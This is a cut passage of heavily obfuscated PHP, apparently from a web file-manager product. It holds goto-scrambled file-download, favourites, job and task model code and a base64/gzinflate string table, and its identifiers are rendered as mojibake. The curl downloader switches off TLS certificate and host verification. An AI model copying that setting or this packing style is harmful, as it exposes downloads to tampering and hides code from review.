$cö‰åˆéÁÙ, $fíé—‡Áôº); goto E®‘ÇèíÁ; cã›êĞØÈ: $fíé—‡Áôº = intval($bËÀá— îå[$C¡„ÎÊø˜ğ[321]]); if (file_exists($B ×É¼èİÎ) && time() - filemtime($B ×É¼èİÎ) < 3) { return array($C¡„ÎÊø˜ğ[1035] => !1, $C¡„ÎÊø˜ğ[1037] => $C¡„ÎÊø˜ğ[1492]); } $Cš¼„ğ÷ˆ = array(); goto Fšİ„ìÎô; CÜ¶Š‰œ¢ñ: $C¡„ÎÊø˜ğ =& $_SERVER[Õİõş]; if (!request_url_safe($añ Á˜Æ×Õ)) { return array($C¡„ÎÊø˜ğ[1035] => !1, $C¡„ÎÊø˜ğ[1037] => $C¡„ÎÊø˜ğ[1040]); } $DòÇÑ©é‘­ = $F¥ïÉ‹§ç . $C¡„ÎÊø˜ğ[1490]; goto AëŸ‡÷ì; E®‘ÇèíÁ: if ($B«˜””Ù[$C¡„ÎÊø˜ğ[1035]]) { @unlink($DòÇÑ©é‘­); } return $B«˜””Ù; goto dåÜÇ¥½¼›; AëŸ‡÷ì: $B ×É¼èİÎ = $F¥ïÉ‹§ç . $C¡„ÎÊø˜ğ[1491]; if (is_array($añ Á˜Æ×Õ)) { $bËÀá— îå = $añ Á˜Æ×Õ; } else { $bËÀá— îå = url_header($añ Á˜Æ×Õ); } $añ Á˜Æ×Õ = $bËÀá— îå[$C¡„ÎÊø˜ğ[291]]; goto D±İ©Ø¼ˆ; Fšİ„ìÎô: if (is_file($DòÇÑ©é‘­)) { $cÁ¢ƒî¶áÍ = file_get_contents($DòÇÑ©é‘­); $Cš¼„ğ÷ˆ = json_decode($cÁ¢ƒî¶áÍ, 1); } if (file_exists($F¥ïÉ‹§ç) && $fíé—‡Áôº == filesize($F¥ïÉ‹§ç)) { @unlink($B ×É¼èİÎ); @unlink($DòÇÑ©é‘­); return array($C¡„ÎÊø˜ğ[1035] => !0, $C¡„ÎÊø˜ğ[1037] => $C¡„ÎÊø˜ğ[1493]); } if ($Cš¼„ğ÷ˆ[$C¡„ÎÊø˜ğ[321]] != $fíé—‡Áôº) { $Cš¼„ğ÷ˆ = array($C¡„ÎÊø˜ğ[321] => $fíé—‡Áôº); } goto F‹à«ˆ£ Ç; D±İ©Ø¼ˆ: if (!$añ Á˜Æ×Õ) { return array($C¡„ÎÊø˜ğ[1035] => !1, $C¡„ÎÊø˜ğ[1037] => $C¡„ÎÊø˜ğ[1040]); } if (!$bËÀá— îå[$C¡„ÎÊø˜ğ[1284]] || $bËÀá— îå[$C¡„ÎÊø˜ğ[321]] == 0) { @unlink($B ×É¼èİÎ); @unlink($F¥ïÉ‹§ç); $B«˜””Ù = self::fileDownloadFopen($añ Á˜Æ×Õ, $F¥ïÉ‹§ç, $bËÀá— îå[$C¡„ÎÊø˜ğ[321]]); if ($B«˜””Ù[$C¡„ÎÊø˜ğ[1035]]) { return $B«˜””Ù; } else { @unlink($B ×É¼èİÎ); @unlink($F¥ïÉ‹§ç); $B«˜””Ù = self::fileDownloadCurl($añ Á˜Æ×Õ, $F¥ïÉ‹§ç, !1, 0, $bËÀá— îå[$C¡„ÎÊø˜ğ[321]]); @unlink($B ×É¼èİÎ); return $B«˜””Ù; } } $cö‰åˆéÁÙ = is_file($B ×É¼èİÎ) ? filesize($B ×É¼èİÎ) : 0; goto cã›êĞØÈ; dåÜÇ¥½¼›: } static function fileDownloadFopen($cÌˆ›š“§§, $Bí²ƒ‰Ÿ½, $f¯‹÷Ëğ·à = 0) { $Bî“À§»ëÄ =& $_SERVER[Õİõş]; @ini_set($Bî“À§»ëÄ[1494], $Bî“À§»ëÄ[1495]); $a•Ô¬Ì¶ğ = $Bí²ƒ‰Ÿ½ . $Bî“À§»ëÄ[1491]; set_timeout(); @unlink($a•Ô¬Ì¶ğ); if ($Cé¡Áõ˜¸“ = @fopen($cÌˆ›š“§§, $Bî“À§»ëÄ[1496])) { goto CÊ”±ÙïÌ‘; CÊ”±ÙïÌ‘: if (!($c¡ÂÅ‘ŒÀ = @fopen($a•Ô¬Ì¶ğ, $Bî“À§»ëÄ[1497]))) { return array($Bî“À§»ëÄ[1035] => !1, $Bî“À§»ëÄ[1037] => $Bî“À§»ëÄ[1498]); } while (!feof($Cé¡Áõ˜¸“)) { if (!file_exists($a•Ô¬Ì¶ğ)) { fclose($c¡ÂÅ‘ŒÀ); return array($Bî“À§»ëÄ[1035] => !1, $Bî“À§»ëÄ[1037] => $Bî“À§»ëÄ[1499]); } clearstatcache(); if ($f¯‹÷Ëğ·à > 0 && $f¯‹÷Ëğ·à == filesize(iconv_system($a•Ô¬Ì¶ğ))) { break; } fwrite($c¡ÂÅ‘ŒÀ, fread($Cé¡Áõ˜¸“, 1024 * 8), 1024 * 8); } fclose($c¡ÂÅ‘ŒÀ); goto e…Ÿ«Å•í…; bíĞ”‘å¥Ã: self::checkGzip($a•Ô¬Ì¶ğ); if (!@rename($a•Ô¬Ì¶ğ, $Bí²ƒ‰Ÿ½)) { usleep(round(rand(0, 1000) * 50)); @unlink($Bí²ƒ‰Ÿ½); $DÜ¼º¶ÔÒ² = @rename($a•Ô¬Ì¶ğ, $Bí²ƒ‰Ÿ½); if (!$DÜ¼º¶ÔÒ²) { return array($Bî“À§»ëÄ[1035] => !1, $Bî“À§»ëÄ[1037] => $Bî“À§»ëÄ[1501]); } } return array($Bî“À§»ëÄ[1035] => !0, $Bî“À§»ëÄ[1037] => $Bî“À§»ëÄ[698]); goto BšàËŸÈ®¦; e…Ÿ«Å•í…: fclose($Cé¡Áõ˜¸“); $c¹ÂøöÊó• = filesize(iconv_system($a•Ô¬Ì¶ğ)); if ($f¯‹÷Ëğ·à != 0 && $c¹ÂøöÊó• != $f¯‹÷Ëğ·à) { return array($Bî“À§»ëÄ[1035] => !1, $Bî“À§»ëÄ[1037] => $Bî“À§»ëÄ[1500]); } goto bíĞ”‘å¥Ã; BšàËŸÈ®¦: } else { return array($Bî“À§»ëÄ[1035] => !1, $Bî“À§»ëÄ[1037] => $Bî“À§»ëÄ[1502]); } } static function fileDownloadCurl($EºÄÕÄÑ»Ÿ, $dù¦ëŒõÄ , $d—ŠÜ›–› = false, $bĞö åÂª¾ = 0, $F‘ö¨Ü‰«Æ = 0) { goto AÛË¾‡™Õ; CÖ–®†Ë: curl_setopt($aå®ŸÚØ‹–, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($aå®ŸÚØ‹–, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($aå®ŸÚØ‹–, CURLOPT_SSL_VERIFYHOST, 0); goto c‚ÑïÖÍ‚£; c‚ÑïÖÍ‚£: curl_setopt($aå®ŸÚØ‹–, CURLOPT_NOPROGRESS, !1); curl_setopt($aå®ŸÚØ‹–, CURLOPT_PROGRESSFUNCTION, $B¥Ô‹½ø•[1504]); curl_progress_start($aå®ŸÚØ‹–); goto CßƒÌÇËğ©; B‡öàÕàÜ: curl_close($aå®ŸÚØ‹–); fclose($Ağ¸¼„Õ«»); $fö¤”™ëã© = filesize(iconv_system($A“ˆÛ¬‡ñ)); goto C¼¬»ÁÓ®; d™ß½»êÅÁ: if ($d—ŠÜ›–›) { curl_setopt($aå®ŸÚØ‹–, CURLOPT_RANGE, $bĞö åÂª¾ . $B¥Ô‹½ø•[716]); } curl_setopt($aå®ŸÚØ‹–, CURLOPT_FILE, $Ağ¸¼„Õ«»); curl_setopt($aå®ŸÚØ‹–, CURLOPT_REFERER, get_url_link($EºÄÕÄÑ»Ÿ)); goto CÖ–®†Ë; A¾¼Ü»±º: return array($B¥Ô‹½ø•[1035] => !1, $B¥Ô‹½ø•[1037] => $B¥Ô‹½ø•[1506]); goto DÌŠÁ„êè; AÛË¾‡™Õ: $B¥Ô‹½ø• =& $_SERVER[Õİõş]; $A“ˆÛ¬‡ñ = $dù¦ëŒõÄ  . $B¥Ô‹½ø•[1491]; set_timeout(); goto dÕ‚¥¾ïƒÕ; CßƒÌÇËğ©: curl_setopt($aå®ŸÚØ‹–, CURLOPT_USERAGENT, $B¥Ô‹½ø•[1495]); $F‘¹å¢ÈË® = curl_exec($aå®ŸÚØ‹–); curl_progress_end($aå®ŸÚØ‹–); goto B‡öàÕàÜ; C¼¬»ÁÓ®: if ($fö¤”™ëã© < $F‘ö¨Ü‰«Æ && $F‘ö¨Ü‰«Æ != 0) { return array($B¥Ô‹½ø•[1035] => !1, $B¥Ô‹½ø•[1037] => $B¥Ô‹½ø•[1492]); } if ($fö¤”™ëã© > $F‘ö¨Ü‰«Æ && $F‘ö¨Ü‰«Æ != 0) { return array($B¥Ô‹½ø•[1035] => !1, $B¥Ô‹½ø•[1037] => $B¥Ô‹½ø•[1500]); } if ($F‘¹å¢ÈË® && filesize($A“ˆÛ¬‡ñ) != 0) { self::checkGzip($A“ˆÛ¬‡ñ); if (!@rename($A“ˆÛ¬‡ñ, $dù¦ëŒõÄ )) { @unlink($dù¦ëŒõÄ ); $F‘¹å¢ÈË® = @rename($A“ˆÛ¬‡ñ, $dù¦ëŒõÄ ); if (!$F‘¹å¢ÈË®) { return array($B¥Ô‹½ø•[1035] => !1, $B¥Ô‹½ø•[1037] => $B¥Ô‹½ø•[1505]); } } return array($B¥Ô‹½ø•[1035] => !0, $B¥Ô‹½ø•[1037] => $B¥Ô‹½ø•[698]); } goto A¾¼Ü»±º; dÕ‚¥¾ïƒÕ: $Ağ¸¼„Õ«» = @fopen($A“ˆÛ¬‡ñ, $B¥Ô‹½ø•[984]); if (!$Ağ¸¼„Õ«») { return array($B¥Ô‹½ø•[1035] => !1, $B¥Ô‹½ø•[1037] => $B¥Ô‹½ø•[1503]); } $aå®ŸÚØ‹– = curl_init($EºÄÕÄÑ»Ÿ); goto d™ß½»êÅÁ; DÌŠÁ„êè: } static function checkGzip($b‡•ÊòğÃ) { goto eéÆ¶Æâ‹; b¡‰¿¸×Ì‘: file_put_contents($b‡•ÊòğÃ, $fñìº§á¦‹); goto C¾Ş“¸„…•; BÕà†²ÇŞ³: ob_start(); readgzfile($b‡•ÊòğÃ); $fñìº§á¦‹ = ob_get_clean(); goto b¡‰¿¸×Ì‘; eéÆ¶Æâ‹: $bÀ­È‚»ŒË = $_SERVER[Õİõş][1507]; $C ®Î¹¤™Ë = file_sub_str($b‡•ÊòğÃ, 0, 2); if ($bÀ­È‚»ŒË != $C ®Î¹¤™Ë) { return; } goto BÕà†²ÇŞ³; C¾Ş“¸„…•: } } goto B·¢—Ïï¾‹; bÕäŸ¼æÉ»: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\x74\141\163\153\x4c\151\163\164"; public $field = array("\x6e\141\x6d\145", "\164\171\x70\145", "\x65\166\x65\156\164", "\164\151\155\145", "\x64\x65\163\143", "\163\171\x73\164\x65\155", "\x65\156\x61\x62\x6c\x65", "\x6c\141\x73\x74\x52\165\x6e", "\x73\x6f\x72\164"); public function listData($cÒ†‹ğÑç¯ = false, $EƒÙ–õ‘Ã = "\163\x6f\x72\164", $fÇ¥áÌµí = false) { return parent::listData($cÒ†‹ğÑç¯, $EƒÙ–õ‘Ã, $fÇ¥áÌµí); } public function add($fİ¤±Ø­Ê®) { $aˆÊòîÉ =& $_SERVER[Õİõş]; $eØÛ¶³÷¦„ = $this->findByName($fİ¤±Ø­Ê®[$aˆÊòîÉ[28]]); if ($eØÛ¶³÷¦„) { return !1; } $fİ¤±Ø­Ê®[$aˆÊòîÉ[1382]] = 0; $fİ¤±Ø­Ê®[$aˆÊòîÉ[2101]] = $this->getSort(); return parent::insert($fİ¤±Ø­Ê®); } private function getSort() { $c«ê£®¹… =& $_SERVER[Õİõş]; $bÈƒç«¯» = parent::listData(); $E¶è–ÜÁœ = array_to_keyvalue($bÈƒç«¯», $c«ê£®¹…[33], $c«ê£®¹…[2101]); return empty($E¶è–ÜÁœ) ? 0 : max($E¶è–ÜÁœ) + 1; } public function update($CïÎŠïÛ’î, $e°øÁ¹) { $BğôôÌøá“ =& $_SERVER[Õİõş]; $FÍé¸½óÏ¬ = $this->listData($CïÎŠïÛ’î); $aâ‡–å‘ï¬ = $this->findByName($e°øÁ¹[$BğôôÌøá“[28]]); if (!$FÍé¸½óÏ¬ || $aâ‡–å‘ï¬ && $aâ‡–å‘ï¬[$BğôôÌøá“[363]] != $FÍé¸½óÏ¬[$BğôôÌøá“[363]]) { return !1; } return parent::update($CïÎŠïÛ’î, $e°øÁ¹); } public function remove($AÉ‡§„²’, $dæ¾Š˜Æ· = false) { $e×ï«º‡”˜ =& $_SERVER[Õİõş]; $CÔÒÈ§† Ö = $this->listData($AÉ‡§„²’); if (!$CÔÒÈ§† Ö) { return; } if (!$dæ¾Š˜Æ· && $CÔÒÈ§† Ö[$e×ï«º‡”˜[1083]] == $e×ï«º‡”˜[83]) { return !1; } return parent::remove($AÉ‡§„²’); } public function enable($Bä‹µøÒ§Ä, $F¹‡µ‹Íë³) { return $this->update($Bä‹µøÒ§Ä, array($_SERVER[Õİõş][2443] => $F¹‡µ‹Íë³)); } public function run($DŒÒÄ‰³İ) { return $this->update($DŒÒÄ‰³İ, array($_SERVER[Õİõş][2453] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\146\141\166"; protected function cacheFunctionAlias($E’´¥Ì„é—) { $AÂ‹óê– =& $_SERVER[Õİõş]; return array($AÂ‹óê–[2454] => array(USER_ID, $AÂ‹óê–[2455])); } protected function listData() { $cåÒÉêƒ‘Á =& $_SERVER[Õİõş]; $fÎ®¯—º¦ö = array($cåÒÉêƒ‘Á[1408] => USER_ID, $cåÒÉêƒ‘Á[431] => 0); $d«‡¢¢İå¢ = $cåÒÉêƒ‘Á[2456]; $Fç‡…ò§Ú‰ = $this->field($d«‡¢¢İå¢)->where($fÎ®¯—º¦ö)->order($cåÒÉêƒ‘Á[2457])->select(); return $Fç‡…ò§Ú‰ ? $Fç‡…ò§Ú‰ : array(); } protected function resetCache() { } protected function listView() { goto fºÔ¼¤‚«ù; AË¶ëğ : $eÀ¯ÄÛ”‡ = array($FèŒô·ŠÕ[379] => array($FèŒô·ŠÕ[380], $Dğ¢Ş¤¿êë)); $aë÷÷Î¾Ëƒ = Model($FèŒô·ŠÕ[754])->listSource($eÀ¯ÄÛ”‡, $A¶œ“Ò§¢—); $aë÷÷Î¾Ëƒ = array_merge($aë÷÷Î¾Ëƒ[$FèŒô·ŠÕ[73]], $aë÷÷Î¾Ëƒ[$FèŒô·ŠÕ[74]]); goto F˜ôóö¨Ë¹; D±‰ŒÆå¡: $Dğ¢Ş¤¿êë = array_to_keyvalue($AŸµ¬šîˆ, $FèŒô·ŠÕ[33], $FèŒô·ŠÕ[75]); if (!$Dğ¢Ş¤¿êë) { return $aíœ…‡©Û›; } $A¶œ“Ò§¢— = 2000; goto AË¶ëğ ; F˜ôóö¨Ë¹: $aë÷÷Î¾Ëƒ = array_to_keyvalue($aë÷÷Î¾Ëƒ, $FèŒô·ŠÕ[365]); foreach ($aíœ…‡©Û› as $Dà—ÉÃ¤ => $e‘é‰äÄ‹) { $B¬ „èÔÚ = $aë÷÷Î¾Ëƒ[$e‘é‰äÄ‹[$FèŒô·ŠÕ[75]]]; $B¬ „èÔÚ = $B¬ „èÔÚ ? $B¬ „èÔÚ : array(); $aíœ…‡©Û›[$Dà—ÉÃ¤] = array_merge($B¬ „èÔÚ, $e‘é‰äÄ‹); } return $aíœ…‡©Û›; goto f¯ƒ¿ìˆÃ¢; fºÔ¼¤‚«ù: $FèŒô·ŠÕ =& $_SERVER[Õİõş]; $aíœ…‡©Û› = $this->listData(); $AŸµ¬šîˆ = array_filter_by_field($aíœ…‡©Û›, $FèŒô·ŠÕ[29], $FèŒô·ŠÕ[378]); goto D±‰ŒÆå¡; f¯ƒ¿ìˆÃ¢: } protected function addFav($còØ¾’Á˜, $BÛßÃœ›„œ = '', $fæÌ‚ë² = "\163\x6f\165\162\x63\145") { goto eíŸÆÚâó‡; eíŸÆÚâó‡: $e½ëÚ°÷Œ… =& $_SERVER[Õİõş]; $c¥‡êÜéÌ• = array($e½ëÚ°÷Œ…[1408] => USER_ID, $e½ëÚ°÷Œ…[431] => 0, $e½ëÚ°÷Œ…[384] => $fæÌ‚ë², $e½ëÚ°÷Œ…[383] => $còØ¾’Á˜); if ($this->where($c¥‡êÜéÌ•)->find()) { return !1; } goto E©ğÈÓ©à; DÕ×ââ‚·: if (!$BÛßÃœ›„œ && $fæÌ‚ë² == $e½ëÚ°÷Œ…[378]) { $a„ÎÏ¦Î¡Š = Model($e½ëÚ°÷Œ…[1113])->where(array($e½ëÚ°÷Œ…[379] => $còØ¾’Á˜))->find(); if (!$a„ÎÏ¦Î¡Š) { return !1; } $BÛßÃœ›„œ = $a„ÎÏ¦Î¡Š[$e½ëÚ°÷Œ…[28]]; } $BÛßÃœ›„œ = $this->getAutoName($BÛßÃœ›„œ); $d‘ÅÑ÷Ú‡  = array($e½ëÚ°÷Œ…[1408] => USER_ID, $e½ëÚ°÷Œ…[431] => 0, $e½ëÚ°÷Œ…[382] => $BÛßÃœ›„œ, $e½ëÚ°÷Œ…[383] => $còØ¾’Á˜, $e½ëÚ°÷Œ…[384] => $fæÌ‚ë², $e½ëÚ°÷Œ…[2084] => $E¤†¬àøÚ­ + 1); goto bé­¾ÈÊÚ; E©ğÈÓ©à: $c¥‡êÜéÌ• = array($e½ëÚ°÷Œ…[1408] => USER_ID, $e½ëÚ°÷Œ…[431] => 0); $E¤†¬àøÚ­ = $this->where($c¥‡êÜéÌ•)->max($e½ëÚ°÷Œ…[2101]); if (!$E¤†¬àøÚ­) { $E¤†¬àøÚ­ = 0; } goto DÕ×ââ‚·; bé­¾ÈÊÚ: return $this->add($d‘ÅÑ÷Ú‡ ); goto Eç¶¤×Ÿ°ñ; Eç¶¤×Ÿ°ñ: } protected function remove($Eã¿‘ª¿¹Ñ) { $CÏ«‹Òá¸á =& $_SERVER[Õİõş]; $c‚°øàÌ¿ = array($CÏ«‹Òá¸á[1408] => USER_ID, $CÏ«‹Òá¸á[381] => $Eã¿‘ª¿¹Ñ); return $this->where($c‚°øàÌ¿)->delete(); } protected function removeByName($DáÎæŠ½çÔ) { $dÔŠ˜¥„Á =& $_SERVER[Õİõş]; $føù¥¥¸ƒ× = array($dÔŠ˜¥„Á[1408] => USER_ID, $dÔŠ˜¥„Á[382] => $DáÎæŠ½çÔ, $dÔŠ˜¥„Á[431] => 0); return $this->where($føù¥¥¸ƒ×)->delete(); } protected function rename($C‡÷Ç“…ßØ, $f¾§çÉ­Î) { $Dğäïˆ¬Ã‚ =& $_SERVER[Õİõş]; if ($C‡÷Ç“…ßØ == $f¾§çÉ­Î) { return !1; } $FŞ›ˆ¹öæ‘ = $this->getAutoName($f¾§çÉ­Î); if ($f¾§çÉ­Î != $FŞ›ˆ¹öæ‘) { return !1; } $c´¼ÅÛ°Á = array($Dğäïˆ¬Ã‚[1408] => USER_ID, $Dğäïˆ¬Ã‚[431] => 0, $Dğäïˆ¬Ã‚[28] => $C‡÷Ç“…ßØ); return $this->where($c´¼ÅÛ°Á)->save(array($Dğäïˆ¬Ã‚[28] => $f¾§çÉ­Î)); } protected function resetSort($B£ï…ãµ±) { $Càß–Š¿­ì =& $_SERVER[Õİõş]; $B£ï…ãµ± = is_array($B£ï…ãµ±) ? $B£ï…ãµ± : array(); $dØÚŞ™ = array($Càß–Š¿­ì[1408] => USER_ID); for ($A âæòëì = 0; $A âæòëì < count($B£ï…ãµ±); $A âæòëì++) { $dØÚŞ™[$Càß–Š¿­ì[381]] = $B£ï…ãµ±[$A âæòëì]; $this->where($dØÚŞ™)->save(array($Càß–Š¿­ì[2084] => $A âæòëì + 1)); } return !0; } protected function moveTop($AÎ¸—íäšù) { goto fÔ…•ÊÇ‘”; BïÉö¸: $F³×ÃáÜŠ = $f¶ÄØ®¨ï; $f¶ÄØ®¨ï = array_remove_value($f¶ÄØ®¨ï, $A«‚ÑåÃ·‹[$dÑÁÌÒíÍ£[363]]); array_unshift($f¶ÄØ®¨ï, $A«‚ÑåÃ·‹[$dÑÁÌÒíÍ£[363]]); goto bä´Š¶Âø¼; bä´Š¶Âø¼: return $this->resetSort($f¶ÄØ®¨ï); goto CÕ¾ê™‹´Ú; fÔ…•ÊÇ‘”: $dÑÁÌÒíÍ£ =& $_SERVER[Õİõş]; $cÜ†ƒó•ßõ = array($dÑÁÌÒíÍ£[1408] => USER_ID, $dÑÁÌÒíÍ£[431] => 0); $A«‚ÑåÃ·‹ = $this->where($cÜ†ƒó•ßõ)->where(array($dÑÁÌÒíÍ£[28] => $AÎ¸—íäšù))->find(); goto D¬ôñ±½à; D¬ôñ±½à: if (!$A«‚ÑåÃ·‹) { return; } $f¶ÄØ®¨ï = $this->field($dÑÁÌÒíÍ£[363])->where($cÜ†ƒó•ßõ)->order($dÑÁÌÒíÍ£[2457])->select(); $f¶ÄØ®¨ï = array_to_keyvalue($f¶ÄØ®¨ï, $dÑÁÌÒíÍ£[33], $dÑÁÌÒíÍ£[363]); goto BïÉö¸; CÕ¾ê™‹´Ú: } protected function moveBottom($fíÀÔÚ£„) { $d‹«¬Ê§Úõ =& $_SERVER[Õİõş]; $d’õí‹Âº = array($d‹«¬Ê§Úõ[1408] => USER_ID, $d‹«¬Ê§Úõ[431] => 0); $b½ÖÏ˜Ñ = $this->where($d’õí‹Âº)->max($d‹«¬Ê§Úõ[2101]); $dòÛÚÛß³À = array($d‹«¬Ê§Úõ[2101] => $b½ÖÏ˜Ñ + 1); return $this->where($d’õí‹Âº)->where(array($d‹«¬Ê§Úõ[28] => $fíÀÔÚ£„))->save($dòÛÚÛß³À); } private function getAutoName($c£ÒØÔ…ø¡) { goto cíÒµîÀ¥; cíÒµîÀ¥: $f£ßî»éŞ¿ =& $_SERVER[Õİõş]; $Eª¾™Æ‡Æ = array($f£ßî»éŞ¿[1408] => USER_ID, $f£ßî»éŞ¿[431] => 0); $F»íä„ŸÎ = $this->field($f£ßî»éŞ¿[28])->where($Eª¾™Æ‡Æ)->select(); goto BÀÏí×¬›­; F‹ÖšĞê…Ê: return $c£ÒØÔ…ø¡ . "\50{$B°âµ–ÖÑé}\x29"; goto C³œ‘‘ö‘¼; BÀÏí×¬›­: $F»íä„ŸÎ = array_to_keyvalue($F»íä„ŸÎ, $f£ßî»éŞ¿[33], $f£ßî»éŞ¿[28]); if (!$F»íä„ŸÎ || !in_array($c£ÒØÔ…ø¡, $F»íä„ŸÎ)) { return $c£ÒØÔ…ø¡; } for ($B°âµ–ÖÑé = 0; $B°âµ–ÖÑé < count($F»íä„ŸÎ); $B°âµ–ÖÑé++) { if (!in_array($c£ÒØÔ…ø¡ . "\50{$B°âµ–ÖÑé}\x29", $F»íä„ŸÎ)) { return $c£ÒØÔ…ø¡ . "\x28{$B°âµ–ÖÑé}\51"; } } goto F‹ÖšĞê…Ê; C³œ‘‘ö‘¼: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\152\157\x62\x4c\151\163\164"; public $field = array("\156\141\155\x65", "\x64\x65\163\x63", "\x73\157\x72\164"); const JOB_KEY = "\x73\145\x6c\146\x4a\x6f\x62\x4c\151\x73\164"; public function listData($d¨£¤†ÂØ„ = false, $C†ïØÄÃò› = "\x73\x6f\162\x74", $d¿†ŒÛ›‰ = false) { return parent::listData($d¨£¤†ÂØ„, $C†ïØÄÃò›, $d¿†ŒÛ›‰); } public function remove($dãÅ¸ÄíƒÆ) { return parent::remove($dãÅ¸ÄíƒÆ); } public function add($C­ ’öòëœ) { $cÈã Û‹°• =& $_SERVER[Õİõş]; if ($this->findByName($C­ ’öòëœ[$cÈã Û‹°•[28]])) { return !1; } $C­ ’öòëœ[$cÈã Û‹°•[2101]] = $this->getSort(); return parent::insert($C­ ’öòëœ); } private function getSort() { $e“åîôÄêØ =& $_SERVER[Õİõş]; $dÛ–êäˆ‚‡ = parent::listData(); $B¯µ•¡µäî = array_to_keyvalue($dÛ–êäˆ‚‡, $e“åîôÄêØ[33], $e“åîôÄêØ[2101]); return empty($B¯µ•¡µäî) ? 0 : max($B¯µ•¡µäî) + 1; } public function update($aˆ‰¯ëÀ‚, $EŸîØ±»óÂ) { $C¼‰ÂÖÁÈ£ =& $_SERVER[Õİõş]; $DÓ÷¥Ìµ = parent::listData($aˆ‰¯ëÀ‚); $e¼œ¤ˆ·”á = $this->findByName($EŸîØ±»óÂ[$C¼‰ÂÖÁÈ£[28]]); if (!$DÓ÷¥Ìµ || $e¼œ¤ˆ·”á && $e¼œ¤ˆ·”á[$C¼‰ÂÖÁÈ£[363]] != $DÓ÷¥Ìµ[$C¼‰ÂÖÁÈ£[363]]) { return !1; } return parent::update($aˆ‰¯ëÀ‚, $EŸîØ±»óÂ); } public function setUserJob($aÁÌÓÁ¦‘ø, $D©ëÆÀæ®) { goto fÂ¿‹ª¹ç; EíÂ¦Ë¤å: $e˜¿¨õ•› = rtrim($e˜¿¨õ•›, $CÊñÑíÀ¹ç[47]); Model($CÊñÑíÀ¹ç[472])->metaSet($aÁÌÓÁ¦‘ø, self::JOB_KEY, $e˜¿¨õ•›); goto c˜ˆ‡ô­¦˜; fÂ¿‹ª¹ç: $CÊñÑíÀ¹ç =& $_SERVER[Õİõş]; if (!is_array($D©ëÆÀæ®)) { $D©ëÆÀæ® = array($D©ëÆÀæ®); } $b†íÜªùŸ® = parent::listData(); goto BÑŠĞÀº‰; BÑŠĞÀº‰: $E¶Ïšˆ‹¯Ñ = array_to_keyvalue($b†íÜªùŸ®, $CÊñÑíÀ¹ç[28]); $e˜¿¨õ•› = $CÊñÑíÀ¹ç[357]; foreach ($D©ëÆÀæ® as $c‚ëµà†Áì) { if ($E¶Ïšˆ‹¯Ñ[$c‚ëµà†Áì]) { $e˜¿¨õ•› .= $E¶Ïšˆ‹¯Ñ[$c‚ëµà†Áì][$CÊñÑíÀ¹ç[363]] . $CÊñÑíÀ¹ç[47]; } else { $a¼”Îïå©Ï = $this->add($c‚ëµà†Áì); $e˜¿¨õ•› .= $a¼”Îïå©Ï . $CÊñÑíÀ¹ç[47]; } } goto EíÂ¦Ë¤å; c˜ˆ‡ô­¦˜: } public function getUserJob($Fß‚¯ÖÅÀ¢) { $d½¯¢·‹—é = Model($_SERVER[Õİõş][472])->metaGet($Fß‚¯ÖÅÀ¢); return $this->getUserJobInfo($d½¯¢·‹—é[self::JOB_KEY]); } public function getUserJobInfo($bİÀš±á) { goto A“’ššó®¾; Aš†åÓêîÅ: return $CÅøÍåÎº; goto B°­íãÑ ; d¢…“ˆ·™ã: $a“Å›«ëåí = array_remove_key($a“Å›«ëåí, $d˜íÄù†¢[183]); $CÅøÍåÎº = array(); foreach ($f‡å¥ÚÕ´ˆ as $aÅåÕ¦¿…ä) { if (isset($a“Å›«ëåí[$aÅåÕ¦¿…ä])) { $CÅøÍåÎº[] = $a“Å›«ëåí[$aÅåÕ¦¿…ä]; } } goto Aš†åÓêîÅ; A“’ššó®¾: $d˜íÄù†¢ =& $_SERVER[Õİõş]; $f‡å¥ÚÕ´ˆ = explode($d˜íÄù†¢[47], $bİÀš±á); $a“Å›«ëåí = parent::listData(); goto d¢…“ˆ·™ã; B°­íãÑ : } } goto FŠ«ÈÃ„ ; d¹××À¡‚¦: if (!function_exists('_kodDe')) { function _kodDe($dÚ«õËÑİã) { $dÚ«õËÑİã = base64_decode($dÚ«õËÑİã); $F¥š˜¸•©ˆ = strlen($dÚ«õËÑİã); $f¿ğõìÉø“ = ''; $d¶¤×Ğ„ã× = ord($dÚ«õËÑİã[0]) - 30; for ($aÎÊñÙŞò = 1; $aÎÊñÙŞò < $F¥š˜¸•©ˆ; $aÎÊñÙŞò += 2) { if ($aÎÊñÙŞò + 1 < $F¥š˜¸•©ˆ) { $f¿ğõìÉø“ .= chr(ord($dÚ«õËÑİã[$aÎÊñÙŞò + 1]) + $d¶¤×Ğ„ã×); $f¿ğõìÉø“ .= chr(ord($dÚ«õËÑİã[$aÎÊñÙŞò]) + $d¶¤×Ğ„ã×); } else { $f¿ğõìÉø“ .= chr(ord($dÚ«õËÑİã[$aÎÊñÙŞò]) + $d¶¤×Ğ„ã×); } } return $f¿ğõìÉø“; } } define("\xd5\xdd\xf5\xfe", "\365\222\252\320\360"); $_SERVER[Õİõş] = explode("\174\1\174\4\174\3", gzinflate(substr(base64_decode('H4sIAAAAAAAAA509B5gbxdX00MMPoRNYzuWayhXX8xXrJN2d8N3pkHQ+26ezvJJW0vokrW53pSu2').base64_decode('Qwk2AQP5CaGXEFogEDDFDiV000MNmBZKQmw6IQRTUsg/fWZXOpL8fJw18+bN7JQ3b97MvPdmwz/v').base64_decode('WLvr2j3W7v7Vc2c+ci4Ort1t7Z4ghMLHbdx7F/Tf7rkTH+zfrfGgs2ev/Me+/VfsP/PNM3b1LL/a')."\61\166\306\306\107\257\251\375\370\201\171\77\335\242\336\163\356\21\355\157\236\177\261\62\364\320\265\177\135\331\242\355\170\172\377\327\143\237\334\362\305\341\267\54\75\265\253\346\246\345\67\314\215\77\61\43\366"."\331\56\217\117\35\161\367\21\227\271\136\176\122\272\142\163\303\370\315\37\356\173\172\362\365\27\333\36\270\373\264\347\132\117\233\375\253\17\216\274\367\245\243\326\376\371\244\33\317\373\315\13\341\133\357\176\365"."\xf0\x59\x2b\x13\xbb\xfc\xf9\x57\xdd\x3f\xfa\xf3\x1\x1b\xda\x9f\xd8\xfd\xab\x9b\x9b\xe\x2e\x7d\xfe\xd4\xfa\x93\xf\xda\x51\xda\x7d\x43\xa8\x73\xd7\x15\xcd\xaf\x9c\xb2\xf8\xcd\x1b\xfe\x3e\x78\x55\xc7\x71\x5b\x37\x1e\xf